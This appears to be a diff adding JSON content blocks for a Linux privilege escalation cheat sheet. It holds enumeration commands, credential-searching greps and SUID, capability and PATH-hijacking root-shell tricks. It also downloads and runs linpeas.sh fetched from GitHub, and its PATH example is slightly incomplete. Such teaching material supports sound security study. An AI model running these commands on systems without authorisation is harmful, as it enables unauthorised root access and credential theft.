@@ -1,0 +1,316 @@
+[
+  {
+    "type": "section_heading",
+    "id": "privesc-intro",
+    "text": "Linux Privilege Escalation Command Cheat Sheet"
+  },
+  {
+    "type": "order_block",
+    "id": "privesc-definition",
+    "text": "Privilege escalation is the process of gaining higher-level permissions on a system after obtaining an initial foothold such as a web shell or limited user account."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "privesc-basic-enum",
+    "text": "Basic Enumeration Commands"
+  },
+  {
+    "type": "code_block",
+    "id": "privesc-basic-code",
+    "language": "bash",
+    "code": "whoami\nid\nhostname\nuname -a\ncat /etc/os-release"
+  },
+  {
+    "type": "output_block",
+    "id": "privesc-basic-output",
+    "language": "text",
+    "code": "whoami -> shows current user\nid -> shows user id and groups\nhostname -> shows machine name\nuname -a -> kernel and system information"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "privesc-system-info",
+    "text": "System Information Enumeration"
+  },
+  {
+    "type": "code_block",
+    "id": "privesc-system-code",
+    "language": "bash",
+    "code": "uname -a\ncat /proc/version\nlsb_release -a\nuname -r"
+  },
+  {
+    "type": "output_block",
+    "id": "privesc-system-output",
+    "language": "text",
+    "code": "Kernel version\nOperating system distribution\nSystem architecture"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "privesc-user-enum",
+    "text": "User Enumeration"
+  },
+  {
+    "type": "code_block",
+    "id": "privesc-user-code",
+    "language": "bash",
+    "code": "cat /etc/passwd\ncat /etc/passwd | grep bash\nls /home"
+  },
+  {
+    "type": "output_block",
+    "id": "privesc-user-output",
+    "language": "text",
+    "code": "Lists all users on the system\nShows users with login shells\nLists user home directories"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "privesc-sudo",
+    "text": "Checking Sudo Privileges"
+  },
+  {
+    "type": "code_block",
+    "id": "privesc-sudo-code",
+    "language": "bash",
+    "code": "sudo -l"
+  },
+  {
+    "type": "output_block",
+    "id": "privesc-sudo-output",
+    "language": "text",
+    "code": "Lists commands the current user can run as root"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "privesc-suid",
+    "text": "Finding SUID Binaries"
+  },
+  {
+    "type": "code_block",
+    "id": "privesc-suid-code",
+    "language": "bash",
+    "code": "find / -perm -4000 2>/dev/null"
+  },
+  {
+    "type": "output_block",
+    "id": "privesc-suid-output",
+    "language": "text",
+    "code": "Lists binaries with SUID bit set which may run with root privileges"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "privesc-suid-exploit",
+    "text": "Example SUID Exploit"
+  },
+  {
+    "type": "code_block",
+    "id": "privesc-suid-exploit-code",
+    "language": "bash",
+    "code": "find . -exec /bin/sh \\; -quit"
+  },
+  {
+    "type": "output_block",
+    "id": "privesc-suid-exploit-output",
+    "language": "text",
+    "code": "Spawns a shell if find is executed with elevated privileges"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "privesc-writable",
+    "text": "Finding Writable Files"
+  },
+  {
+    "type": "code_block",
+    "id": "privesc-writable-code",
+    "language": "bash",
+    "code": "find / -writable -type f 2>/dev/null\nfind / -writable -type d 2>/dev/null"
+  },
+  {
+    "type": "output_block",
+    "id": "privesc-writable-output",
+    "language": "text",
+    "code": "Lists writable files and directories that may allow privilege escalation"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "privesc-cron",
+    "text": "Cron Job Enumeration"
+  },
+  {
+    "type": "code_block",
+    "id": "privesc-cron-code",
+    "language": "bash",
+    "code": "crontab -l\ncat /etc/crontab\nls /etc/cron*"
+  },
+  {
+    "type": "output_block",
+    "id": "privesc-cron-output",
+    "language": "text",
+    "code": "Lists scheduled tasks that may run as root"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "privesc-path-hijack",
+    "text": "PATH Hijacking"
+  },
+  {
+    "type": "code_block",
+    "id": "privesc-path-code",
+    "language": "bash",
+    "code": "echo $PATH"
+  },
+  {
+    "type": "order_block",
+    "id": "privesc-path-explanation",
+    "text": "If a root script calls a command without an absolute path, an attacker may place a malicious binary earlier in the PATH."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "privesc-path-exploit",
+    "text": "Example PATH Hijacking Exploit"
+  },
+  {
+    "type": "code_block",
+    "id": "privesc-path-exploit-code",
+    "language": "bash",
+    "code": "echo \"/bin/bash\" > tar\nchmod +x tar\nexport PATH=/tmp:$PATH"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "privesc-capabilities",
+    "text": "Checking Linux Capabilities"
+  },
+  {
+    "type": "code_block",
+    "id": "privesc-cap-code",
+    "language": "bash",
+    "code": "getcap -r / 2>/dev/null"
+  },
+  {
+    "type": "output_block",
+    "id": "privesc-cap-output",
+    "language": "text",
+    "code": "Lists binaries with special Linux capabilities"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "privesc-cap-exploit",
+    "text": "Capability Exploit Example"
+  },
+  {
+    "type": "code_block",
+    "id": "privesc-cap-exploit-code",
+    "language": "bash",
+    "code": "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "privesc-network",
+    "text": "Network Enumeration"
+  },
+  {
+    "type": "code_block",
+    "id": "privesc-network-code",
+    "language": "bash",
+    "code": "netstat -tulpn\nss -tulpn"
+  },
+  {
+    "type": "output_block",
+    "id": "privesc-network-output",
+    "language": "text",
+    "code": "Lists open ports and services running on the machine"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "privesc-process",
+    "text": "Running Processes"
+  },
+  {
+    "type": "code_block",
+    "id": "privesc-process-code",
+    "language": "bash",
+    "code": "ps aux"
+  },
+  {
+    "type": "output_block",
+    "id": "privesc-process-output",
+    "language": "text",
+    "code": "Displays all running processes and their owners"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "privesc-password-search",
+    "text": "Searching for Passwords"
+  },
+  {
+    "type": "code_block",
+    "id": "privesc-pass-code",
+    "language": "bash",
+    "code": "grep -r \"password\" / 2>/dev/null\ngrep -r \"pass\" /var/www"
+  },
+  {
+    "type": "output_block",
+    "id": "privesc-pass-output",
+    "language": "text",
+    "code": "Searches system files and web directories for stored credentials"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "privesc-auto-tools",
+    "text": "Automated Enumeration Tools"
+  },
+  {
+    "type": "code_block",
+    "id": "privesc-linpeas-code",
+    "language": "bash",
+    "code": "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh"
+  },
+  {
+    "type": "output_block",
+    "id": "privesc-linpeas-output",
+    "language": "text",
+    "code": "LinPEAS automatically scans the system for privilege escalation vulnerabilities"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "privesc-kernel",
+    "text": "Kernel Exploit Enumeration"
+  },
+  {
+    "type": "code_block",
+    "id": "privesc-kernel-code",
+    "language": "bash",
+    "code": "uname -r\nsearchsploit linux kernel"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "privesc-summary",
+    "text": "Most Important PrivEsc Commands"
+  },
+  {
+    "type": "code_block",
+    "id": "privesc-top3",
+    "language": "bash",
+    "code": "sudo -l\nfind / -perm -4000 2>/dev/null\ngetcap -r / 2>/dev/null"
+  },
+  {
+    "type": "order_block",
+    "id": "privesc-summary-text",
+    "text": "These three commands quickly identify the most common privilege escalation vectors on Linux systems."
+  }
+]
